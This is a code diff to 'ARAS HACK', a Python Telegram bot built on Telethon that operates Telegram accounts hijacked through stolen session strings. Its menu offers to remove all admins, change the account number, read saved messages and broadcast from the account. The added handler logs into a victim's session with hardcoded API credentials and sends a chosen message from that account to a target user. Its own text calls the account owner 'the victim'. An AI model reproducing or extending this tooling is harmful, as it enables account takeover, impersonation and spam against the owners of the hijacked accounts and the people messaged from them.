@@ -281,7 +281,7 @@ menu = '''
 **🅚** :~ [حذف جميع المشرفين]
 **🅛** :~ [ترقيه عضو الى مشرف]
 **🅜** :~ [تغير رقم الحساب]
-**🅝** :~ [البث الجماعي الشامل]
+**🅝** :~ [الأذاعة الشاملةة]
 **🅞** :~ [جلب الرسائل المحفوظة]
 **🅟** :~ [جلب رسائل مستخدم معين]
 **🅠** :~ [تغيير البايو]
@@ -592,12 +592,18 @@ async def users(event):
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"ARAS-Hack-N")))
 async def start(event):
     keyboard_gcast = [
-        [Button.inline("🅐🅐 - للجميع", data="ARAS-Gcast-AA")],
-        [Button.inline("🅑🅑 - للمجموعات", data="ARAS-Gcast-BB")],
-        [Button.inline("🅒🅒 - للأشخاص", data="ARAS-Gcast-CC")],
+        [Button.inline("🅐 - للجميع", data="ARAS-Gcast-AA")],
+        [Button.inline("🅑 - للمجموعات", data="ARAS-Gcast-BB")],
+        [Button.inline("🅒 - للأشخاص", data="ARAS-Gcast-CC")],
+        [Button.inline("🅓 - لشخص معين", data="ARAS-Gcast-DD")],
         [Button.url("• المـطور •", "https://t.me/Lx5x5")]
     ]
-    await event.reply("**اختر نوع البث الجماعي:**\n\n**🅐🅐** - إرسال للجميع\n**🅑🅑** - إرسال للمجموعات فقط\n**🅒🅒** - إرسال للأشخاص فقط", buttons=keyboard_gcast)
+    await event.reply("**📢 اختر نوع البث الجماعي:**\n\n"
+                     "**🅐** - إرسال للجميع\n"
+                     "**🅑** - إرسال للمجموعات فقط\n"
+                     "**🅒** - إرسال للأشخاص فقط\n"
+                     "**🅓** - إرسال لشخص معين", 
+                     buttons=keyboard_gcast)
 
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"ARAS-Gcast-AA")))
 async def users(event):
@@ -646,6 +652,59 @@ async def users(event):
         await x.send_message("**جاري الإرسال...**")
         i = await gcastc(strses.text, msg.text)
         await event.reply(f"**تم البث للأشخاص بنجاح** ✅", buttons=keyboard)
+
+@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"ARAS-Gcast-DD")))
+async def send_to_specific_user(event):
+    async with bot.conversation(event.chat_id) as x:
+        await x.send_message("**📩 إرسال رسالة لشخص معين**\n\n**الان ارسل الكود تيرمكس**")
+        strses = await x.get_response()
+        op = await cu(strses.text)
+        if not op:
+            return await event.respond("**لقد تم انهاء جلسة هذا الكود من قبل الضحية**\n/hack", buttons=keyboard)
+        
+        await x.send_message("**👤 أرسل لي يوزر أو ايدي الشخص:**\n\n"
+                           "**مثال اليوزر:** `@username`\n"
+                           "**مثال الايدي:** `123456789`")
+        user_target = await x.get_response()
+        
+        await x.send_message("**💬 الآن أرسل الرسالة التي تريد إرسالها:**")
+        message_text = await x.get_response()
+        
+        await x.send_message("**⏳ جاري الإرسال...**")
+        
+        try:
+            async with tg(ses(strses.text), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as client:
+                try:
+                    # التحقق من نوع المدخل (يوزر أو ايدي)
+                    if user_target.text.startswith('@'):
+                        # إذا كان يوزر
+                        user_entity = await client.get_entity(user_target.text)
+                    else:
+                        # إذا كان ايدي رقمي
+                        user_entity = await client.get_entity(int(user_target.text))
+                    
+                    # إرسال الرسالة
+                    await client.send_message(user_entity.id, message_text.text)
+                    
+                    # إرسال تأكيد
+                    await event.reply(f"**✅ تم إرسال الرسالة بنجاح إلى:**\n\n"
+                                    f"**👤 الاسم:** {user_entity.first_name or 'غير معروف'}\n"
+                                    f"**🆔 الايدي:** `{user_entity.id}`\n"
+                                    f"**📧 اليوزر:** @{getattr(user_entity, 'username', 'لا يوجد')}\n\n"
+                                    f"**📝 الرسالة:**\n`{message_text.text[:100]}...`\n\n"
+                                    f"**شكراً لأستخدامك ARAS HACK 🔰**", 
+                                    buttons=keyboard)
+                    
+                except ValueError:
+                    await event.reply("**❌ خطأ:** الرقم غير صحيح. تأكد من إدخال رقم ايدي صحيح.", buttons=keyboard)
+                except Exception as e:
+                    if "Could not find entity" in str(e):
+                        await event.reply("**❌ لم يتم العثور على المستخدم.**\nتأكد من اليوزر أو الايدي.", buttons=keyboard)
+                    else:
+                        await event.reply(f"**❌ حدث خطأ:**\n`{str(e)}`", buttons=keyboard)
+                        
+        except Exception as e:
+            await event.reply(f"**❌ فشل الاتصال بالحساب:**\n`{str(e)}`", buttons=keyboard)
 
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"ARAS-Hack-O")))
 async def users(event):
